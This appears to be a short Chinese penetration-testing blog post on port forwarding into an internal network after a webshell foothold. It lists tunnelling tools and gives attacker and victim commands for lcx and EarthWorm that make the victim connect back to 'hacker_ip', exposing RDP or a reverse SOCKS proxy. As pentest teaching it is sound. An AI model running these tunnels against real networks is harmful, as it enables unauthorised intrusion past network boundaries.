---
draft: false
date: 2016-08-08 19:33:45
title: 端口转发
description: 
categories:
  - Pentest
tags:
  - 端口转发
---

### 0x00 应用场景
* 内网IP的80端口通过端口映射到了外网IP的80端口上
* 内网的Web服务器通过外网IP反向代理(如Nginx)
也就是说Web服务器在内网中

### 0x01 判断Web是否为内网
* 向ping域名，查看IP是外网
* 用webshell查看ip却是内网IP

### 0x02 端口转发工具
* lcx
* htran
* [EarthWorm](http://rootkiter.com/EarthWorm/?_blank)
* netsh
* [reGeorg](https://github.com/sensepost/reGeorg?_blank)
* meterpreter porfwd

### 0x03 lcx端口转发
* Hacker：lcx.exe -listen 500 8888
* Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389
* Hacker：cmd mstsc hacker_ip:500

![hacker运行lcx](/img/post/privilge_escalation_win_hacker_run_lcx.png)
![vimctim端运行lcx](/img/post/privilge_escalation_win_vimctim_run_lcx.png)
![hacker远程连接](/img/post/privilge_escalation_win_hacker_remote_conn.png)
![hacker远程连接成功](/img/post/privilge_escalation_win_hacker_remote_conn_success.png)

### 0x04 EarchWorm端口转发
* Hacker：./ew -s rcsocks -l 1080 -e 8888
* Victim：./ew -s rssocks -d hacker_ip -e 8888
![earchworm原理](/img/post/privilge_escalation_win_earchworm.png)
#### 1. 启动EarchWorm
![hacker服务器启动ew](/img/post/privilge_escalation_win_linux_run_ew.png)
![victim启动ew](/img/post/privilge_escalation_win_victim_run_ew.png)
![victim连接hacker服务器](/img/post/privilge_escalation_win_linux_get_victim_conn.png)
#### 2. hacker主机使用代理
![hacker内网主机设置代理1](/img/post/privilge_escalation_win_hacker_set_proxy1.png)
![hacker内网主机设置代理2](/img/post/privilge_escalation_win_hacker_set_proxy2.png)
#### 3. hacker内网主机连接目标的内网主机
![hacker连接内网主机](/img/post/privilge_escalation_win_ew_hacker_remote_conn.png)
![hacker连接内网主机成功](/img/post/privilge_escalation_win_ew_hacker_remote_conn_success.png)
